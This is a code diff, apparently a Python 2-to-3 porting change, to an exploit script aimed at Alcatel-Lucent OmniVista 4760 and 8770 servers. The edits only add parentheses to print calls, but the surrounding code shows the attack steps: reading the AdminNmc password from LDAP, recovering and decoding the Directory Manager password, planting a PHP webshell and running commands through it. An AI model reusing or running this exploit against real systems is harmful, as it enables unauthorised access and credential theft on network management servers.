@@ -75,7 +75,7 @@ class OmniVista:
 		connect.set_option(ldap.OPT_REFERRALS, 0)
 		connect.simple_bind_s(self.username, self.password)
 		result = connect.search_s('o=nmc', ldap.SCOPE_SUBTREE, '(cn=AdminNmc)')
-		print('[*] Current AdminNmc password: ' + str(result[0][1]['userpassword'][0]))
+		print(('[*] Current AdminNmc password: ' + str(result[0][1]['userpassword'][0])))
 		self.bind = connect
 		return True
 
@@ -119,20 +119,20 @@ class OmniVista:
 		return requests.post(self.host + self.folder + 'poc.php', data = {"0": cmd}, verify=False).text
 
 	def autoexploit(self):
-		print('[*] Attempting to exploit on {}'.format(self.host))
+		print(('[*] Attempting to exploit on {}'.format(self.host)))
 		self.model = self.identify()
 		if self.model == 4760:
-			print('[*] Model is {}'.format(str(self.model)))
+			print(('[*] Model is {}'.format(str(self.model))))
 			self.exploit4760()
-			print('[*] Upload folder is {}'.format(self.folder))
+			print(('[*] Upload folder is {}'.format(self.folder)))
 			output = self.exec4760("whoami")
-			print('[*] Webshell at {}{}{}'.format(self.host, self.folder, self.filename))
-			print('[*] Command output: '.format(output))
+			print(('[*] Webshell at {}{}{}'.format(self.host, self.folder, self.filename)))
+			print(('[*] Command output: '.format(output)))
 		elif self.model == 8770:
-			print('[*] Model is {}'.format(str(self.model)))
+			print(('[*] Model is {}'.format(str(self.model))))
 			self.username = "cn=Directory Manager"
 			self.password = self.decodepassword(self.getpassword())
-			print('[*] {} password is "{}"'.format(self.username, self.password))
+			print(('[*] {} password is "{}"'.format(self.username, self.password)))
 			if self.checkldap():
 				print('[*] LDAP Service is accessible!')
 				self.connectldap()
@@ -142,8 +142,8 @@ class OmniVista:
 				if self.login():
 					self.exploit8770()
 					output = self.exec8770("whoami")
-					print('[*] Webshell at {}{}{}'.format(self.host, "themes/Theme2/", self.filename))
-					print('[*] Command output: '.format(output))
+					print(('[*] Webshell at {}{}{}'.format(self.host, "themes/Theme2/", self.filename)))
+					print(('[*] Command output: '.format(output)))
 				else:
 					print("[x] Directory license not installed :/")
 					return False
